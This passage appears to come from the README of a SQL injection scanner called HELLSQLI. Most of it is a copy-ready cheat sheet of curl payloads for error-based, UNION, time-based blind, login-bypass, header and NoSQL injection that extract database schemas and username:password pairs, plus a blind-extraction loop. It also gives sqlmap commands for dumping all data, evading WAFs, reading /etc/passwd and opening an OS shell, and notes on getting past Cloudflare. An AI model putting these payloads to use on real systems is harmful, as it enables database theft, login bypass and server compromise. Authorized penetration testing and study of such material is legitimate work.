# Extract DB name
curl -sk "https://target.com/page?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--"

# Extract current user
curl -sk "https://target.com/page?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))--"

# Extract all databases
curl -sk "https://target.com/page?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT group_concat(schema_name) FROM information_schema.schemata)))--"

# Extract tables from DB
curl -sk "https://target.com/page?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--"

# Extract columns from table
curl -sk "https://target.com/page?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users')))--"

# Extract data
curl -sk "https://target.com/page?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT group_concat(username,':',password) FROM users)))--"
```

### UNION-Based (MySQL)

```bash
# Find number of columns
curl -sk "https://target.com/page?id=1' ORDER BY 1--"  # increase until error
curl -sk "https://target.com/page?id=1' ORDER BY 4--"  # error = 3 columns

# Find output column (inject marker)
curl -sk "https://target.com/page?id=-1' UNION SELECT 'HELLSQLI',NULL,NULL--"
curl -sk "https://target.com/page?id=-1' UNION SELECT NULL,'HELLSQLI',NULL--"

# Extract data (assuming 3 cols, output in col 2)
curl -sk "https://target.com/page?id=-1' UNION SELECT NULL,version(),NULL--"
curl -sk "https://target.com/page?id=-1' UNION SELECT NULL,database(),NULL--"
curl -sk "https://target.com/page?id=-1' UNION SELECT NULL,group_concat(schema_name),NULL FROM information_schema.schemata--"
curl -sk "https://target.com/page?id=-1' UNION SELECT NULL,group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--"
curl -sk "https://target.com/page?id=-1' UNION SELECT NULL,group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='users'--"
curl -sk "https://target.com/page?id=-1' UNION SELECT NULL,group_concat(username,0x3a,password),NULL FROM users--"
```

### Time-Based Blind (MySQL)

```bash
# Confirm SQLi (5s delay = vulnerable)
curl -sk "https://target.com/page?id=1' AND SLEEP(5)--" -w "\nTime: %{time_total}s"

# Extract DB name character by character
# IF first char of database() is 't', delay 5s:
curl -sk "https://target.com/page?id=1' AND IF(SUBSTRING(database(),1,1)='t',SLEEP(5),0)--" -w "\nTime: %{time_total}s"

# Extract DB name (loop)
for i in $(seq 1 20); do
  for c in {a..z} {0..9}; do
    TIME=$(curl -sk -w "%{time_total}" -o /dev/null \
      "https://target.com/page?id=1' AND IF(SUBSTRING(database(),$i,1)='$c',SLEEP(3),0)--")
    if (( $(echo "$TIME > 2.5" | bc -l) )); then
      printf "$c"; break
    fi
  done
done
echo ""
```

### Time-Based Blind (MSSQL)

```bash
# Confirm
curl -sk "https://target.com/page?id=1'; WAITFOR DELAY '0:0:5'--"

# Extract
curl -sk "https://target.com/page?id=1'; IF (SUBSTRING(db_name(),1,1)='a') WAITFOR DELAY '0:0:5'--"
```

### PostgreSQL

```bash
# Version
curl -sk "https://target.com/page?id=1' AND 1=CAST((SELECT version()) AS INT)--"
# Time-based
curl -sk "https://target.com/page?id=1'; SELECT pg_sleep(5)--"
# Stacked
curl -sk "https://target.com/page?id=1'; SELECT pg_sleep(5); --"
```

### Login Bypass Payloads

```bash
# Test login endpoint
curl -sk -X POST "https://target.com/login" \
  --data "username=admin'--&password=anything"

curl -sk -X POST "https://target.com/login" \
  --data "username=' OR 1=1--&password=x"

curl -sk -X POST "https://target.com/login" \
  --data "username=admin' OR '1'='1&password=' OR '1'='1"

# Check if login succeeded
curl -sk -X POST "https://target.com/login" \
  -c cookies.txt \
  --data "username=admin'--&password=x" -L | grep -i "dashboard\|logout\|welcome"
```

### Header Injection

```bash
# User-Agent
curl -sk "https://target.com/page" -A "' OR '1'='1"
curl -sk "https://target.com/page" -A "1' AND SLEEP(5)--"

# Referer
curl -sk "https://target.com/page" -H "Referer: ' OR '1'='1"

# X-Forwarded-For
curl -sk "https://target.com/page" -H "X-Forwarded-For: 1' AND SLEEP(5)--"

# Cookie
curl -sk "https://target.com/page" -H "Cookie: session=1' AND SLEEP(5)--"
```

### NoSQL (MongoDB)

```bash
# URL operator injection
curl -sk "https://target.com/api/users?id[$ne]=1"
curl -sk "https://target.com/api/users?username[$regex]=.*&password[$ne]=null"

# JSON body
curl -sk -X POST "https://target.com/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":"null"},"password":{"$ne":"null"}}'

# Check if bypass worked (should return data)
curl -sk "https://target.com/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$gt":""},"password":{"$gt":""}}'
```

### sqlmap Quick Reference

```bash
# Basic detection
sqlmap -u "https://target.com/page?id=1" --batch --dbs

# POST form
sqlmap -u "https://target.com/login" \
  --data "username=test&password=test" --batch --dbs

# With cookie
sqlmap -u "https://target.com/page?id=1" \
  --cookie "session=YOUR_COOKIE" --batch --dbs

# Dump everything
sqlmap -u "https://target.com/page?id=1" \
  --batch --dump-all --threads=5

# WAF bypass
sqlmap -u "https://target.com/page?id=1" \
  --tamper=space2comment,between,randomcase --batch

# Level 5 full test
sqlmap -u "https://target.com/page?id=1" \
  --level=5 --risk=3 --batch --dbms=mysql

# Headers
sqlmap -u "https://target.com/page" \
  --headers="X-Forwarded-For: *" --level=3 --batch

# File read
sqlmap -u "https://target.com/page?id=1" \
  --file-read="/etc/passwd" --batch

# OS shell (if high privileges)
sqlmap -u "https://target.com/page?id=1" \
  --os-shell --batch
```

---

## 🔧 Troubleshooting

### ImportError: No module named 'requests'

```bash
pip3 install requests --break-system-packages
# OR
pip3 install requests
# OR (if pip3 not found)
sudo apt install python3-requests
```

### BS4 Warning

```bash
# Install BeautifulSoup (optional — improves form detection)
pip3 install beautifulsoup4 --break-system-packages
# OR
sudo apt install python3-bs4
```

### Scan Too Slow

```bash
# Skip time-based (5s per payload = very slow)
python3 hellsqli.py -t target.com --skip-time

# Skip crawling (test exact URL only)
python3 hellsqli.py -t target.com/page?id=1 --skip-crawl

# Reduce threads for low-power systems
python3 hellsqli.py -t target.com --threads 3
```

### SSL Certificate Error

```bash
# Tool disables SSL verification by default
# If you want to enable it:
python3 hellsqli.py -t target.com --verify-ssl
```

### 0 Results on Known Vulnerable Target

```bash
# Try WAF bypass
python3 hellsqli.py -t target.com --waf-bypass

# Try all levels
python3 hellsqli.py -t target.com --level 3

# Try with specific parameter
python3 hellsqli.py -t target.com -u "https://target.com/page?id=1"

# Test specific known vulnerable parameter with time-based only
python3 hellsqli.py -t target.com/page?id=1 \
  --skip-crawl --skip-error --skip-blind --skip-union \
  --skip-headers --skip-nosql
```

### Target Uses Cloudflare

```bash
python3 hellsqli.py -t target.com \
  --waf-bypass \
  --random-agent \
  --delay 2 \
  --rate 20 \
  -p http://127.0.0.1:8080  # Use Burp to observe requests
```

### Report Not Found

```bash
# Find all reports
find ~/hellsqli_output -name "HELLSQLI_*.html" 2>/dev/null

# Check for errors
# The tool saves partial report even on Ctrl+C
```

---

## 🤝 Contributing

```bash
# Fork and clone
git clone https://github.com/hellrider978/hellsqli.git
cd hellsqli

# Create feature branch
git checkout -b feature/oracle-error-extraction

# Test on legal vulnerable targets
python3 hellsqli.py -t https://testphp.vulnweb.com --ultra

# Submit PR
git add .
git commit -m "Add: Oracle XMLTYPE error extraction payloads"
git push origin feature/oracle-error-extraction
```

### Wanted Features

```
[ ] OOB (Out-of-Band) SQLi via DNS — interactsh integration
[ ] Stored XSS via SQLi (write XSS payload into DB via SQLi)
[ ] File read via UNION (LOAD_FILE)
[ ] File write via UNION (INTO OUTFILE)
[ ] OS command execution (xp_cmdshell, UDF)
[ ] Password hash cracking (hashcat integration)
[ ] Automatic CVE match based on DB version
[ ] Burp Suite extension version
[ ] Mass target mode (--targets-file with multiple domains)
[ ] GitHub Codespaces integration
[ ] SQLi to RCE escalation chains
```

---

## 👤 Author

<div align="center">

```
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║    ██████╗  █████╗      ██╗███████╗███████╗██╗  ██╗             ║
║    ██╔══██╗██╔══██╗     ██║██╔════╝██╔════╝██║  ██║             ║
║    ██████╔╝███████║     ██║█████╗  ███████╗███████║             ║
║    ██╔══██╗██╔══██║██   ██║██╔══╝  ╚════██║██╔══██║             ║
║    ██║  ██║██║  ██║╚█████╔╝███████╗███████║██║  ██║             ║
║    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝ ╚══════╝╚══════╝╚═╝  ╚═╝             ║
║                     B A J I Y A                                   ║
╚═══════════════════════════════════════════════════════════════════╝
```

## RAJESH BAJIYA
### 🔥 HACKEROFHELL

**Bug Bounty Hunter · Penetration Tester · Security Researcher**
**"Built by a man from Hell — for hunters who find what others miss"**

<br>

[![GitHub](https://img.shields.io/badge/GitHub-hellrider978-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hellrider978)
[![HackerOne](https://img.shields.io/badge/HackerOne-hellrider978-494649?style=for-the-badge&logo=hackerone&logoColor=white)](https://hackerone.com/hellrider978)
[![Bugcrowd](https://img.shields.io/badge/Bugcrowd-hellrider978-F26822?style=for-the-badge&logo=bugcrowd&logoColor=white)](https://bugcrowd.com/hellrider978)

<br>

---

```
"SQL injection has been around since 1998.
 It still works in 2024.
 HELLSQLI makes sure you find every single one."

               — RAJESH BAJIYA | HACKEROFHELL
```

---

### ⭐ If HELLSQLI helped you find a bounty — Star it!

[![Star](https://img.shields.io/badge/⭐%20Star%20This%20Repo-hellrider978%2Fhellsqli-ffd60a?style=for-the-badge)](https://github.com/hellrider978/hellsqli)

<br>

**Built with 🔥 by RAJESH BAJIYA (HACKEROFHELL)**
**GitHub: [hellrider978](https://github.com/hellrider978)**

`#sqlinjection` `#bugbounty` `#pentesting` `#kalilinux` `#hackerofhell` `#rajeshbajiya` `#hellrider978` `#sqlmap` `#automation` `#infosec`

</div>

---

## 📜 License

```
MIT License — Copyright (c) 2024 RAJESH BAJIYA (HACKEROFHELL / hellrider978)
GitHub: https://github.com/hellrider978/hellsqli

For authorized testing only.
Author not responsible for misuse, damage, or illegal activity.
```

---

<div align="center">

```
💉 HELLSQLI v1.0 ULTRA 💉
Built by RAJESH BAJIYA — HACKEROFHELL — hellrider978
https://github.com/hellrider978/hellsqli
```

</div>
